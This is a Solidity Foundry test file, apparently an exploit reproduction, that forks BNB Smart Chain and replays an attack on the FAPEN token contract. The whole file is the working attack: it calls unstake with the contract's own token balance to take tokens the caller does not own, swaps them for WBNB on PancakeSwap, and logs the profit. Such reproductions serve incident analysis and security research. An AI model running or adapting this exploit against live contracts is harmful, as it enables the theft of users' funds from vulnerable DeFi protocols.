// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Phalcon Explorer: https://explorer.phalcon.xyz/tx/bsc/0xa2be65e439eb182e8f2acfe7eff9a4bab55eb3cd789dcc0ddd19bf811af78a93

interface IFapen {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function unstake(uint256 amount) external;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);
}

contract Fapen is Test {
    IFapen FAPEN = IFapen(0xf3F1aBae8BfeCA054B330C379794A7bf84988228);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair Pair = IPancakePair(0x1d1043D07B842c97a948E51c50470FDc7A02B9da);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 28637846);
    }

    function testFapenExploit() external {
        console.log("Attacker WBNB Balance at start:", WBNB.balanceOf(address(this)));  
        uint amt = FAPEN.balanceOf(address(FAPEN));
        FAPEN.unstake(amt); 
        emit log_named_decimal_uint(
            "Amount of FAPEN after calling unstake",
            FAPEN.balanceOf(address(this)),
            9
        );
        FAPEN.approve(address(Router), type(uint).max);

        address[] memory path = new address[](2);
        path[0] = address(FAPEN);
        path[1] = address(WBNB); 

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FAPEN.balanceOf(address(this)), 
            0, path, address(this), block.timestamp + 1000);

        
        emit log_named_decimal_uint(
            "Amount of WBNB after attack",
            WBNB.balanceOf(address(this)),
            18
        );
    }
}
